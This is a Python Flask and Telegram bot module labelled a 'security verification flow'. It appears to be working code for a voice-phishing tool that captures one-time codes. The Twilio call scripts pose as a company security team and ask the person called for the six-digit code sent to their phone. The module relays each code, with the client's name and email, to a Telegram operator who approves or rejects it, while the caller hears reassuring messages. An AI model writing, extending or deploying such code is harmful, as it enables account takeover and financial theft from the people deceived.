"""
SECURITY two-stage verification flow.
"""

from flask import Blueprint, Response, request
from twilio.twiml.voice_response import VoiceResponse
from telebot import types

import dbase as db
from modules import call_state as cs
from modules.bot_core import bot, send, safe_answer
from modules.notify import notify_caller, format_digits

security_bp = Blueprint("security", __name__)

HOLD_POLL_SECONDS = 3
HOLD_MAX_SECONDS = 600


def _xml(body):
    return Response(str(body), mimetype="application/xml")


def _hold_twiml(say_text=None, then_endpoint="/webhooks/voice/verify/security_hold"):
    resp = VoiceResponse()
    if say_text:
        resp.say(say_text)
    resp.pause(length=HOLD_POLL_SECONDS)
    resp.redirect(then_endpoint, method="POST")
    return str(resp)


# ============================================================
# Stage 1 - security alert
# ============================================================

@security_bp.route("/webhooks/voice/verify/security_alert", methods=["POST"])
def v_security_alert():
    digits = request.values.get("Digits", "") or ""
    call_sid = request.values.get("CallSid", "")
    script = request.values.get("script", "") or "SECURITY"
    company = request.values.get("company", "")
    step = request.values.get("step", "")

    cs.ensure(call_sid, script=script, company=company, phase="security_alert")

    try:
        client_name, client_email = db.get_call_client(call_sid)
    except Exception:
        client_name, client_email = (None, None)

    try:
        chat_id, _uid = db.get_call_owner(call_sid)
    except Exception:
        chat_id = None

    if chat_id:
        step_txt = f"Step {step}" if step else "Security alert"
        client_line = ""
        if client_name or client_email:
            client_line = (
                f"\nClient: *{client_name or '-'}*"
                f"\nEmail: `{client_email or '-'}`"
            )
        company_txt = f"\nCompany: *{company}*" if company else ""

        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(
            types.InlineKeyboardButton(
                "✅ Approve — send code prompt",
                callback_data=f"sec_app:{call_sid}",
            ),
            types.InlineKeyboardButton(
                "❌ Reject — client already verified",
                callback_data=f"sec_rej:{call_sid}",
            ),
        )

        send(
            chat_id,
            f"🚨 *Security alert triggered* ({step_txt})\n"
            f"Caller indicated this was *not them* "
            f"(pressed: {format_digits(digits)})"
            f"{client_line}"
            f"{company_txt}\n\n"
            f"*Approve* → caller is asked to enter the 6-digit code.\n"
            f"*Reject* → caller is thanked for securing their account and the call ends.",
            parse_mode="Markdown",
            reply_markup=kb,
        )

    cs.set_phase(call_sid, "security_hold")

    resp = VoiceResponse()
    resp.say("Please hold while we alert our security team.")
    resp.pause(length=HOLD_POLL_SECONDS)
    resp.redirect("/webhooks/voice/verify/security_hold", method="POST")
    return _xml(resp)


@security_bp.route("/webhooks/voice/verify/security_alert_retry", methods=["POST"])
def v_security_alert_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="security_alert")
    resp = VoiceResponse()
    with resp.gather(num_digits=1,
                     action="/webhooks/voice/verify/security_alert",
                     timeout=8) as g:
        g.say("If you know this was not you, press 1 now. "
              "Otherwise, please stay on the line.")
    resp.redirect("/webhooks/voice/verify/security_alert_retry", method="POST")
    return _xml(resp)


@security_bp.route("/webhooks/voice/verify/security_hold", methods=["POST"])
def v_security_hold():
    sid = request.values.get("CallSid", "")
    st = cs.get(sid) or {}

    if not st:
        cs.ensure(sid, phase="security_hold")
        st = cs.get(sid)

    decision = st.get("security_decision")

    if decision == "approve":
        cs.set_security_decision(sid, None)
        cs.set_phase(sid, "security_code")
        resp = VoiceResponse()
        resp.say("Thank you. To confirm your identity, a six digit code "
                 "has been sent to the phone number on file.")
        resp.redirect("/webhooks/voice/verify/security_code", method="POST")
        return _xml(resp)

    if decision == "reject":
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("Thank you for securing your account. "
                 "Since you have already verified, no further action is needed. "
                 "Goodbye.")
        return _xml(resp)

    attempts = st.get("attempts", 0)
    if attempts * HOLD_POLL_SECONDS > HOLD_MAX_SECONDS:
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("We could not reach our security team. Please call us back. Goodbye.")
        return _xml(resp)

    return _xml(_hold_twiml(
        say_text=None,
        then_endpoint="/webhooks/voice/verify/security_hold",
    ))


# ============================================================
# Stage 2 - security code
# ============================================================

@security_bp.route("/webhooks/voice/verify/security_code", methods=["POST"])
def v_security_code():
    call_sid = request.values.get("CallSid", "")
    entered = request.values.get("Digits", "") or ""
    step = request.values.get("step", "")

    cs.ensure(call_sid, phase="security_code_entered")
    cs.set_code(call_sid, entered)

    try:
        chat_id, _uid = db.get_call_owner(call_sid)
    except Exception:
        chat_id = None

    try:
        client_name, client_email = db.get_call_client(call_sid)
    except Exception:
        client_name, client_email = (None, None)

    try:
        company = db.get_call_company(call_sid)
    except Exception:
        company = None

    if chat_id:
        client_line = ""
        if client_name or client_email:
            client_line = (
                f"\nClient: *{client_name or '-'}*"
                f"\nEmail: `{client_email or '-'}`"
            )
        company_txt = f"\nCompany: *{company}*" if company else ""
        step_txt = f"Step {step}" if step else "Security code"

        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(
            types.InlineKeyboardButton(
                "✅ Approve",
                callback_data=f"sec2_app:{call_sid}",
            ),
            types.InlineKeyboardButton(
                "❌ Reject",
                callback_data=f"sec2_rej:{call_sid}",
            ),
        )

        send(
            chat_id,
            f"🔐 *Security code entered* ({step_txt})\n"
            f"Customer entered: {format_digits(entered)}"
            f"{client_line}"
            f"{company_txt}\n\n"
            f"*Approve* → caller hears verification confirmed and the call ends.\n"
            f"*Reject* → caller is thanked for securing their account and the call ends.",
            parse_mode="Markdown",
            reply_markup=kb,
        )

    resp = VoiceResponse()
    resp.say("Please hold while we verify your code.")
    resp.pause(length=HOLD_POLL_SECONDS)
    resp.redirect("/webhooks/voice/verify/security_code_hold", method="POST")
    return _xml(resp)


@security_bp.route("/webhooks/voice/verify/security_code_retry", methods=["POST"])
def v_security_code_retry():
    call_sid = request.values.get("CallSid", "")
    cs.ensure(call_sid, phase="security_code")

    # Reuse the same cap counter.
    from modules.verify import MAX_STEP_RETRIES, _bump_retry
    if call_sid and _bump_retry(call_sid, "security_code_retry") > MAX_STEP_RETRIES:
        cs.clear(call_sid)
        resp = VoiceResponse()
        resp.say("We did not receive your code. Please try again later. Goodbye.")
        return _xml(resp)

    resp = VoiceResponse()
    with resp.gather(num_digits=6,
                     finish_on_key="#",
                     action="/webhooks/voice/verify/security_code",
                     timeout=20) as g:
        g.say("Please enter the six digit code now, followed by the pound key.")
    resp.redirect("/webhooks/voice/verify/security_code_retry", method="POST")
    return _xml(resp)


@security_bp.route("/webhooks/voice/verify/security_code_hold", methods=["POST"])
def v_security_code_hold():
    sid = request.values.get("CallSid", "")
    st = cs.get(sid) or {}

    if not st:
        cs.ensure(sid, phase="security_code_hold")
        st = cs.get(sid)

    decision = st.get("security_code_decision")

    if decision == "approve":
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("Thank you. Your account is secure and your identity "
                 "has been verified. Goodbye.")
        return _xml(resp)

    if decision == "reject":
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("Thank you for securing your account. No further action "
                 "is needed. Goodbye.")
        return _xml(resp)

    attempts = st.get("attempts", 0)
    if attempts * HOLD_POLL_SECONDS > HOLD_MAX_SECONDS:
        cs.clear(sid)
        resp = VoiceResponse()
        resp.say("We could not verify at this time. Please call us back. Goodbye.")
        return _xml(resp)

    return _xml(_hold_twiml(
        say_text=None,
        then_endpoint="/webhooks/voice/verify/security_code_hold",
    ))


# ============================================================
# Telegram callbacks
# ============================================================

@bot.callback_query_handler(func=lambda c: c.data.startswith("sec_app:"))
def cb_sec_approve(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_security_decision(sid, "approve")
    safe_answer(call, "Approved ✅")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         "✅ Approved — caller will now be asked for the 6-digit code.",
         parse_mode="Markdown")


@bot.callback_query_handler(func=lambda c: c.data.startswith("sec_rej:"))
def cb_sec_reject(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_security_decision(sid, "reject")
    safe_answer(call, "Rejected ❌")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         "❌ Rejected — caller will be thanked for securing their account.",
         parse_mode="Markdown")


@bot.callback_query_handler(func=lambda c: c.data.startswith("sec2_app:"))
def cb_sec2_approve(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_security_code_decision(sid, "approve")
    safe_answer(call, "Approved ✅")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         "✅ Code approved — the call will end with a success message.",
         parse_mode="Markdown")


@bot.callback_query_handler(func=lambda c: c.data.startswith("sec2_rej:"))
def cb_sec2_reject(call):
    sid = call.data.split(":", 1)[1]
    st = cs.get(sid)
    if not st:
        safe_answer(call, "This call is no longer active.", alert=True)
        return
    cs.set_security_code_decision(sid, "reject")
    safe_answer(call, "Rejected ❌")
    try:
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass
    send(call.message.chat.id,
         "❌ Code rejected — caller will be thanked for securing their account.",
         parse_mode="Markdown")